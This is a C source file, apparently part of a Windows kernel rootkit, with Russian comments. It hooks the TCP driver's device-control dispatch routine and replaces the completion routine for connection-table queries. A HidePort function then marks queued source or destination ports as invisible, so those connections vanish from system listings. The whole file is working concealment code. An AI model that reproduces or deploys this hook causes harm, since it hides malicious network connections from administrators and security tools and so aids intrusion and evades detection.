#include "net.h"


NTSTATUS InstallTCPDriverHook(WCHAR* wcTcpDeviceNameBuffer) {

    NTSTATUS status;
    UNICODE_STRING TcpDeviceName;

    RtlInitUnicodeString(&TcpDeviceName, wcTcpDeviceNameBuffer);
    status = IoGetDeviceObjectPointer(&TcpDeviceName, FILE_READ_DATA, &pTcpFile, &pTcpDevice);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pTcpDriver = pTcpDevice->DriverObject;

    glRealIrpMjDeviceControl = pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HookTcpDeviceControl;

    return STATUS_SUCCESS;
}

NTSTATUS HookTcpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {

    PIO_STACK_LOCATION pIrpStack;
    ULONG ioTransferType;
    TDIObjectID* inputBuffer;
    ULONG context;
    NTSTATUS status;

    pIrpStack = IoGetCurrentIrpStackLocation(pIrp);

    switch (pIrpStack->MajorFunction) {
    case IRP_MJ_DEVICE_CONTROL:
        if ((pIrpStack->MinorFunction == 0) &&
            (pIrpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX)) {
            ioTransferType = pIrpStack->Parameters.DeviceIoControl.IoControlCode & 3;
            if (ioTransferType == METHOD_NEITHER) {
                inputBuffer = (TDIObjectID*)pIrpStack->Parameters.DeviceIoControl.Type3InputBuffer;

                // CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP
                if (inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY) {
                    if ((inputBuffer->toi_id == 0x101) || (inputBuffer->toi_id == 0x102) || (inputBuffer->toi_id == 0x110)) {
                        PVOID context;
                        DbgPrint("Request id %x\n", inputBuffer->toi_id);

                        context = pIrpStack->Context;
                        pIrpStack->Context = (PIO_COMPLETION_ROUTINE)ExAllocatePoolWithTag(NonPagedPool, sizeof(CompletionRoutineContext), 'oenN');

                        ((PCompletionRoutineContext)pIrpStack->Context)->oldCompletion = pIrpStack->CompletionRoutine;
                        ((PCompletionRoutineContext)pIrpStack->Context)->reqType = inputBuffer->toi_id;
                        ((PCompletionRoutineContext)pIrpStack->Context)->oldContext = context;
                        ((PCompletionRoutineContext)pIrpStack->Context)->oldControl = pIrpStack->Control;

                        pIrpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)CompletionRoutine;

                        pIrpStack->Control = 0;
                        pIrpStack->Control |= SL_INVOKE_ON_SUCCESS;
                    }
                }
            }
        }
        break;
    default:
        break;
    }



    return glRealIrpMjDeviceControl(pDeviceObject, pIrp);
}

VOID ViewConnects(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType) {

    ULONG entryCount;
    ULONG i;

    // Состояния сетевого соединения, возвращаемые драйвером:
    // 0 = Invisible   
    // 1 = CLOSED   
    // 2 = LISTENING   
    // 3 = SYN_SENT   
    // 4 = SYN_RECEIVED   
    // 5 = ESTABLISHED   
    // 6 = FIN_WAIT_1   
    // 7 = FIN_WAIT_2   
    // 8 = CLOSE_WAIT   
    // 9 = CLOSING
    // ... 

    if (reqType == 0x101) {
        entryCount = outputBufferSize / sizeof(CONNINFO101);
        for (i = 0; i < entryCount; ++i) {

            DbgPrint("Status: %d", ((PCONNINFO101)outputBuffer)[i].status);
            DbgPrint(" %d.%d.%d.%d:%d", ((PCONNINFO101)outputBuffer)[i].src_addr & 0xff, ((PCONNINFO101)outputBuffer)[i].src_addr >> 8 & 0xff, ((PCONNINFO101)outputBuffer)[i].src_addr >> 16 & 0xff, ((PCONNINFO101)outputBuffer)[i].src_addr >> 24, HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
            DbgPrint(" %d.%d.%d.%d:%d\n", ((PCONNINFO101)outputBuffer)[i].dst_addr & 0xff, ((PCONNINFO101)outputBuffer)[i].dst_addr >> 8 & 0xff, ((PCONNINFO101)outputBuffer)[i].dst_addr >> 16 & 0xff, ((PCONNINFO101)outputBuffer)[i].dst_addr >> 24, HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));

        }
    }
    else if (reqType == 0x102) {
        entryCount = outputBufferSize / sizeof(CONNINFO102);
        for (i = 0; i < entryCount; ++i) {

            DbgPrint("Status: %d", ((PCONNINFO102)outputBuffer)[i].status);
            DbgPrint(" %d.%d.%d.%d:%d", ((PCONNINFO102)outputBuffer)[i].src_addr & 0xff, ((PCONNINFO102)outputBuffer)[i].src_addr >> 8 & 0xff, ((PCONNINFO102)outputBuffer)[i].src_addr >> 16 & 0xff, ((PCONNINFO102)outputBuffer)[i].src_addr >> 24, HTONS(((PCONNINFO102)outputBuffer)[i].src_port));
            DbgPrint(" %d.%d.%d.%d:%d\n", ((PCONNINFO102)outputBuffer)[i].dst_addr & 0xff, ((PCONNINFO102)outputBuffer)[i].dst_addr >> 8 & 0xff, ((PCONNINFO102)outputBuffer)[i].dst_addr >> 16 & 0xff, ((PCONNINFO102)outputBuffer)[i].dst_addr >> 24, HTONS(((PCONNINFO102)outputBuffer)[i].dst_port));

        }
    }
    else if (reqType == 0x110) {
        entryCount = outputBufferSize / sizeof(CONNINFO110);
        for (i = 0; i < entryCount; ++i) {

            DbgPrint("Status: %d", ((PCONNINFO110)outputBuffer)[i].status);
            DbgPrint(" %d.%d.%d.%d:%d", ((PCONNINFO110)outputBuffer)[i].src_addr & 0xff, ((PCONNINFO110)outputBuffer)[i].src_addr >> 8 & 0xff, ((PCONNINFO110)outputBuffer)[i].src_addr >> 16 & 0xff, ((PCONNINFO110)outputBuffer)[i].src_addr >> 24, HTONS(((PCONNINFO110)outputBuffer)[i].src_port));
            DbgPrint(" %d.%d.%d.%d:%d\n", ((PCONNINFO110)outputBuffer)[i].dst_addr & 0xff, ((PCONNINFO110)outputBuffer)[i].dst_addr >> 8 & 0xff, ((PCONNINFO110)outputBuffer)[i].dst_addr >> 16 & 0xff, ((PCONNINFO110)outputBuffer)[i].dst_addr >> 24, HTONS(((PCONNINFO110)outputBuffer)[i].dst_port));

        }
    }
    else {
        DbgPrint("Error check\n");
    }
}

VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG portNumber) {

    ULONG entryCount;
    ULONG i;
    PLIST_ENTRY pLink;

    // Состояния сетевого соединения, возвращаемые драйвером:
    // 0 = Invisible   
    // 1 = CLOSED   
    // 2 = LISTENING   
    // 3 = SYN_SENT   
    // 4 = SYN_RECEIVED   
    // 5 = ESTABLISHED   
    // 6 = FIN_WAIT_1   
    // 7 = FIN_WAIT_2   
    // 8 = CLOSE_WAIT   
    // 9 = CLOSING
    // ... 

    for (pLink = glTaskQueueNet.Flink; pLink != &glTaskQueueNet; pLink = pLink->Flink) {
        PTASK_QUEUE_NET task = CONTAINING_RECORD(pLink, TASK_QUEUE_NET, link);
        if (reqType == 0x101) {
            entryCount = outputBufferSize / sizeof(CONNINFO101);
            for (i = 0; i < entryCount; ++i) {
                if (task->isSrc) {
                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                    if (HTONS(((PCONNINFO101)outputBuffer)[i].src_port) == task->port) {
                        ((PCONNINFO101)outputBuffer)[i].status = 0;
                    }
                }
                else {
                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
                    if (HTONS(((PCONNINFO101)outputBuffer)[i].dst_port) == task->port) {
                        ((PCONNINFO101)outputBuffer)[i].status = 0;
                    }
                }
            }
        }
        else if (reqType == 0x102) {
            entryCount = outputBufferSize / sizeof(CONNINFO102);
            for (i = 0; i < entryCount; ++i) {
                if (task->isSrc) {
                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                    if (HTONS(((PCONNINFO102)outputBuffer)[i].src_port) == task->port) {
                        ((PCONNINFO102)outputBuffer)[i].status = 0;
                    }
                }
                else {
                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
                    if (HTONS(((PCONNINFO102)outputBuffer)[i].dst_port) == task->port) {
                        ((PCONNINFO102)outputBuffer)[i].status = 0;
                    }
                }
            }
        }
        else if (reqType == 0x110) {
            entryCount = outputBufferSize / sizeof(CONNINFO110);
            for (i = 0; i < entryCount; ++i) {
                if (task->isSrc) {
                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                    if (HTONS(((PCONNINFO110)outputBuffer)[i].src_port) == task->port) {
                        ((PCONNINFO110)outputBuffer)[i].status = 0;
                    }
                }
                else {
                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                    if (HTONS(((PCONNINFO110)outputBuffer)[i].dst_port) == task->port) {
                        ((PCONNINFO110)outputBuffer)[i].status = 0;
                    }
                }
            }
        }
        else {
            DbgPrint("Error check\n");
        }
    }

    /*
    for(i = 0; i < NumOutputBuffers; i++)
    {
        DbgPrint("Status: %d",OutputBuffer[i].status);
        DbgPrint(" %d.%d.%d.%d:%d",OutputBuffer[i].src_addr & 0xff,OutputBuffer[i].src_addr >> 8 & 0xff, OutputBuffer[i].src_addr >> 16 & 0xff,OutputBuffer[i].src_addr >> 24,HTONS(OutputBuffer[i].src_port));
        DbgPrint(" %d.%d.%d.%d:%d\n",OutputBuffer[i].dst_addr & 0xff,OutputBuffer[i].dst_addr >> 8 & 0xff, OutputBuffer[i].dst_addr >> 16 & 0xff,OutputBuffer[i].dst_addr >> 24,HTONS(OutputBuffer[i].dst_port));
    }*/

    return;
}

NTSTATUS CompletionRoutine(
    IN PDEVICE_OBJECT pDeviceObject,
    IN PIRP pIrp,
    IN PCompletionRoutineContext pContext) {

    PVOID outputBuffer;
    ULONG outputBufferSize;
    PIO_COMPLETION_ROUTINE pOldCompliteRoutine;
    PVOID oldContext;
    UCHAR oldControl;

    outputBuffer = pIrp->UserBuffer;
    pOldCompliteRoutine = pContext->oldCompletion;
    oldContext = pContext->oldContext;
    oldControl = pContext->oldControl;


    if (NT_SUCCESS(pIrp->IoStatus.Status)) {
        // в случае успешной обработки запроса скрываем порт
        //ViewConnects(pIrp->UserBuffer, pIrp->IoStatus.Information, pContext->reqType);
        DbgPrint ("Complete routine %d\n", pIrp->IoStatus.Information);
        HidePort(pIrp->UserBuffer, pIrp->IoStatus.Information, pContext->reqType, 0);
        ExFreePool(pContext);

        if (oldControl & SL_INVOKE_ON_SUCCESS && pOldCompliteRoutine) {
            return pOldCompliteRoutine(pDeviceObject, pIrp, oldContext);
        }
        else {
            return pIrp->IoStatus.Status;
        }
    }
    else {
        // иначе вызываем подменённую функцию завершения.

        return pOldCompliteRoutine(pDeviceObject, pIrp, oldContext);
    }
}




VOID TaskQueueByNet(ULONG input, BOOLEAN isSrc) {

    PTASK_QUEUE_NET task = (PTASK_QUEUE_NET)ExAllocateFromPagedLookasideList(&glPagedTaskQueueNet);
    if (isSrc) task->isSrc = TRUE;
    else task->isSrc = FALSE;
    task->port = input;
    InsertTailList(&glTaskQueueNet, &task->link);

}

VOID FreeListQueueNet() {

    while (!IsListEmpty(&glTaskQueueNet)) {
        PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueNet);
        PTASK_QUEUE_NET task = CONTAINING_RECORD(pLink, TASK_QUEUE_NET, link);
        ExFreeToPagedLookasideList(&glPagedTaskQueueNet, task);
    }

}
VOID PrintTaskQueueNetList() {
    PLIST_ENTRY pLink;
    DbgPrint("NET LIST:\n");
    for (pLink = glTaskQueueNet.Flink; pLink != &glTaskQueueNet; pLink = pLink->Flink) {
        PTASK_QUEUE_NET task = CONTAINING_RECORD(pLink, TASK_QUEUE_NET, link);

        if (task->isSrc) {
            DbgPrint("SRC_PORT: %d\n", task->port);
        }
        else {
            DbgPrint("DST_PORT: %d\n", task->port);
        }
    }
}